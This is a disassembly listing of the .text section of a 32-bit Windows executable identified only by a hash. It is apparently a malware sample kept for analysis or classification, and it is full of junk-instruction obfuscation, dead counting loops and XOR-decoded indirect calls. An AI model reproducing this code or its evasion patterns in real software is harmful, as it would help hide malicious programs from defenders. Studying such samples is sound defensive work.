
612fa0fcd5d4e423904e836d4ba455c145ab365849d907dbd4214e9ab6d74d8a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
